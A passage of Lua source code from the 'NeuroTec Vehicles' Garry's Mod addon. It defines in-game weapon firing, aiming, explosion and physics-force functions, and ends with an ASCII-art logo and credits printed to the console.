	e:SetOrigin( self:GetPos()+self:GetForward()*62 )
	e:SetEntity(self)
	e:SetAttachment(1)
	util.Effect( "StriderMuzzleFlash", e )
	
end

function Meta:ChopperFire()

 	local bullet = {} 
		bullet.Num 		= 1 
		bullet.Src 		= self:GetPos()+self:GetForward()*64	-- Source 
		bullet.Dir 		= self:GetAngles():Forward()			-- Dir of bullet 
		bullet.Spread 	= Vector( 0.03, 0.03, 0.01 )			-- Aim Cone 
		bullet.Tracer	= 1										-- Show a tracer on every x bullets  
		bullet.Force	= 25				 					-- Amount of force to give to phys objects 
		bullet.Damage	= math.random(25,30)
		bullet.AmmoType = "Ar2" 
		bullet.TracerName 	= "AR2Tracer" 
		bullet.Callback    = function (a,b,c) SplodeOnImpact(self,a,b,c) end 
 	self:FireBullets( bullet ) 
	
	self:EmitSound(self.Sound,511,math.random(65,71))
	
	for i=1,2 do
	
		local effectdata = EffectData()
		effectdata:SetStart( self:GetPos() )
		effectdata:SetOrigin( self:GetPos() )
		util.Effect( "RifleShellEject", effectdata )  
		
	end
	
	for i=0,1 do
	
		local e = EffectData()
		e:SetStart( self:GetPos()+self:GetForward()*62 )
		e:SetOrigin( self:GetPos()+self:GetForward()*62 )
		e:SetEntity(self)
		e:SetAttachment(1)
		util.Effect( "ChopperMuzzleFlash", e )
		
	end

end

function Meta:ClusterFire()

 	local bullet = {} 
		bullet.Num 		= 35 
		bullet.Src 		= self:GetPos()+self:GetForward()*64			-- Source 
		bullet.Dir 		= self:GetAngles():Forward()			-- Dir of bullet 
		bullet.Spread 	= Vector( math.random(-5,5),math.random(-5, 5),math.random(-5, 5) )		-- Aim Cone 
		bullet.Tracer	= 0						-- Show a tracer on every x bullets  
		bullet.Force	= 20			 			-- Amount of force to give to phys objects 
		bullet.Damage	= math.random(20,30)
		bullet.AmmoType = "Ar2" 
		bullet.TracerName 	= "AR2Tracer" 
		bullet.Callback    = function (a,b,c) SplodeOnImpact(self,a,b,c) end 
 	self:FireBullets( bullet ) 
	self:EmitSound("weapons/ar2/fire1.wav")
	
	for i=0,1 do
	
		local e = EffectData()
		e:SetStart( self:GetPos()+self:GetForward()*62 )
		e:SetOrigin( self:GetPos()+self:GetForward()*62 )
		e:SetEntity(self)
		e:SetAttachment(1)
		util.Effect( "StriderMuzzleFlash", e )
	end
	
end

function Meta:TurretFire()

 	local bullet = {} 
		bullet.Num 		= 1 
		bullet.Src 		= self:GetPos()+self:GetForward()*128		-- Source 
		bullet.Dir 		= self:GetAngles():Forward()				-- Dir of bullet 
		bullet.Spread 	= Vector( 0.05, 0.05, 0.05 )				-- Aim Cone 
		bullet.Tracer	= 1											-- Show a tracer on every x bullets  
		bullet.Force	= 150			 							-- Amount of force to give to phys objects 
		bullet.Damage	= 20
		bullet.AmmoType = "Ar2" 
		bullet.TracerName 	= "GunshipTracer" 
		bullet.Callback    = function (a,b,c) SplodeOnImpact(self,a,b,c) end  	
	self:FireBullets( bullet ) 
	
	self:EmitSound("weapons/shotgun/shotgun_fire7.wav")
	
	local effectdata = EffectData()
	effectdata:SetStart( self:GetPos() )
	effectdata:SetOrigin( self:GetPos() )
	util.Effect( "RifleShellEject", effectdata )  
	
	local e = EffectData()
	e:SetStart( self:GetPos()+self:GetForward()*62 )
	e:SetOrigin( self:GetPos()+self:GetForward()*62 )
	e:SetEntity(self)
	e:SetAttachment(1)
	util.Effect( "ChopperMuzzleFlash", e )
	
end

function Meta:VTOLAim(Target)

	if ( !IsValid( Target ) ) then 
		
		return 
	
	end
	
	local a = self:GetPos()
	local b = Target:GetPos()
	a.z = 0
	b.z = 0
	local c = Vector( a.x - b.x*-1, a.y - b.y*-1, a.z - b.z )
	local e = math.sqrt( ( c.x ^ 2 ) + ( c.y ^ 2 ) + (c.z ^ 2 ) )
	local target = Vector( -( c.x / e ), -( c.y / e ), -( c.z / e ) )

	self:SetAngles( LerpAngle( 0.005, target:Angle(), self:GetAngles() ) )
	
end

function Meta:GunAim(Target)

	if ( !IsValid( Target ) ) then 
		
		return 
	
	end
	/*
	local a = self:GetPos()
	local b = Target:GetPos()
	local c = Vector( a.x - b.x, a.y - b.y, a.z - b.z ) 
	local e = math.sqrt( ( c.x ^ 2 ) + ( c.y ^ 2 ) + (c.z ^ 2 ) ) 
	local target = Vector( -( c.x / e ), -( c.y / e ), -( c.z / e ) )
	
	self:SetAngles( LerpAngle( 0.005, target:Angle(), self:GetAngles() ) )
	*/
	local dir = ( Target:GetPos() - self:GetPos() ):Angle()
	local d = self:GetPos():Distance( Target:GetPos() )
	local a = self:GetAngles()
	a.p, a.r, a.y = math.ApproachAngle( a.p, dir.p, 1.1 ),math.ApproachAngle( a.r, dir.r, 1.1 ),math.ApproachAngle( a.y, dir.y, 1.1 )

	self:SetAngles( a )
end

function Meta:SCUDAim(Vect)

	if ( !Vect ) then
		
		return
		
	end
	
	local a = self:GetPos() 
	local b = Vect
	local c = Vector( a.x - b.x, a.y - b.y, a.z - b.z )
	local e = math.sqrt( ( c.x ^ 2 ) + ( c.y ^ 2 ) + (c.z ^ 2 ) )
	local target = Vector( -( c.x / e ), -( c.y / e ), -( c.z / e ) )
	
	self:SetAngles( LerpAngle( 0.005, target:Angle(), self:GetAngles() ) )
	
end

function implode( pos, offset, radius, amplitude )

	if ( SERVER  )then
		
		local ents = ents.FindInSphere( pos, radius )
		
		for k,v in pairs( ents ) do
		
			if ( IsValid( v ) &&( v:GetClass() == "prop_physics" || v:IsVehicle() ) ) then
				
				local vPos = v:GetPos()
				
				if ( vPos - pos) == Vector( 0, 0, 0 ) then 
					
					return 
				
				end
				
				local p = v:GetPhysicsObject()
				if( !p ) then return end
				
				local forceimp = amplitude / ( ( ( pos - vPos ):Length() - ( offset ) ) ^ 2 )
				local normalized = ( pos - vPos ):GetNormalized()
				local Towards = normalized * forceimp
				
				if ( !p || p == NULL || p == nil ) then return end
				
				v:SetVelocity( normalized * forceimp )
				
			end
			
		end
		
	end
	
end

function Suck( pos, offset, radius, amplitude )

	if ( SERVER ) then
	
		local ents = ents.FindInSphere( pos, radius )
		
		for k,v in pairs( ents ) do
		
			if ( IsValid( v ) && v:GetClass() == "prop_physics" || v:GetClass() == "npc_cscanner" || v:GetClass() == "npc_rollermine" || v:GetClass() == "gib" ) then
			
				local vPos = v:GetPos()
				
				if ( vPos - pos) == Vector( 0, 0, 0 ) then 
					
					return 
					
				end
				
				if ( vPos:Distance( pos )  < 200 ) then
					
					return
				
				end
				
				local p = v:GetPhysicsObject()
				local forceimp = amplitude / ( ( ( pos - vPos ):Length() - ( offset ) ) ^ 2 )
				local normalized = ( pos - vPos ):GetNormalized()
				local Towards = normalized * forceimp
				
				p:ApplyForceCenter( Towards )
	
			end
		end
	end
end

function Meta:DrawLaserTracer(pos,pos2)

		local effectdata = EffectData()
		effectdata:SetStart( pos )
		effectdata:SetOrigin( pos2 )
		effectdata:SetScale( 1 )
		util.Effect( "TraceBeam", effectdata ) 
		
end

function Meta:JavelinRain(X,owner)

	obj2:EmitSound("Weapon_RPG.Single",100,100)
	
	local rocket = ents.Create("sent_javeline_rocket")
	rocket:SetPos(self:GetPos()+self:GetUp()*64 + self:GetForward()*256)
	rocket:GunAim(X)
	rocket:SetOwner(owner)
	rocket.Target = X
	rocket:SetPhysicsAttacker(owner)
	rocket:Spawn()
	self:GetPhysicsObject():ApplyForceCenter(self:GetForward()*-1700000 + self:GetUp()*-70002)
	
end

function Meta:DumbFireRain(obj2,owner)

	self:EmitSound("Weapon_RPG.Single",200,200)
	local rocket = ents.Create("sent_missile_dumb")
	rocket:SetPos(self:GetPos()+self:GetUp()*64 + self:GetForward()*128)
	rocket:SetAngles(self:GetAngles())
	rocket:SetPhysicsAttacker(owner)
	rocket:SetOwner(owner)
	rocket:Spawn()
	obj2:GetPhysicsObject():ApplyForceCenter(self:GetForward()*-110000 + self:GetUp()*-7002)
	
end


function goBoomSmall(ent)

	local explo = EffectData()
	explo:SetOrigin(ent:GetPos())
	util.Effect("Explosion", explo)
	
	for i=0,10 do

		local explo1 = EffectData()
		explo1:SetOrigin(ent:GetPos()+i*Vector(math.Rand(-15,15),math.Rand(-15,15),10))
		explo1:SetScale(0.25)
		util.Effect("HelicopterMegaBomb", explo1)
		
	end
	
	util.BlastDamage( ent, ent, ent:GetPos(), 350, 200)
	ent:Remove()
	
end

function goBoom(ent,X,owner)
	
	for i=0,1 do
	
		local explo1 = EffectData()
		explo1:SetOrigin(ent:GetPos()+i*Vector(math.Rand(-15,15),math.Rand(-15,15),-2))
		explo1:SetScale(0.25)
		util.Effect("HelicopterMegaBomb", explo1)
	
	end
	
	util.BlastDamage(ent,ent,ent:GetPos(),1200,50)
	ent:Remove()
	
end

function Charge(Obj,Obj2)

	if ( IsValid( Obj ) && IsValid( Obj2 ) ) then
	
		local effectdata = EffectData()
		effectdata:SetOrigin( Obj:GetPos() )
		effectdata:SetStart( Obj:GetPos() )
		effectdata:SetMagnitude(2000)
		effectdata:SetScale(4)
		effectdata:SetEntity( Obj2 )
		util.Effect( "TeslaHitBoxes", effectdata)
		
	end
	
end

print("	                 ?MMMI                  ")
print("	            MMMMMMMNNNNNNNN             ")
print("	         OMMMMNNN.  . ONNNNNNN          ")
print("	        MMMMN.            .DDDD+        ")
print("	      NMMNN                  DDD8       ")
print("	     NMNN      DDDDDD         D888      ")
print("	    MNNN         8888.         ,OOO     ")
print("	   .NNN           8OOO          OZOO    ")
print("	   NNNO           OOZZ.          $ZZ    ")
print("	   NNN           ZZZ$$$          777    ")
print("	  .NDD          Z$$$7777         :II=   ")
print("	   DDD         $$77 III?         ,??~   ")
print("	   DD8        $77I.  ??++        =++   " )
print("	   D888      77II.    ===.       ~~~  "  )
print("	   =88O     7II?      ~~~~~::   :::: "   )
print("	    8OOZ   7I??.       ::::,.. ,,,, "    )
print("	     OZ$$              .      ,,,, "     )
print("	      $$7I?                  .... "      )
print("	       :I?++=             ...... "       )
print("	         +==~~::,,    ........  "        )
print("	            ::,,............   "         )
print("	                ........      "			 )
print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
print("~~~~~~~~~~~~~~~~NeuroTec Vehicles~~~~~~~~~~~~~~~")
print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
Msg( "NeuroTec Vehicle Collection")
print( NeuroPlanesVersion )
MsgN( "Provided to you by:" )
print( Authors )
MsgN( "With contributions from:" )
print( Contributors )
MsgN( "Tested and Approved by:" )
print( Testers )
print( "" )
print( "" )
print( "" )

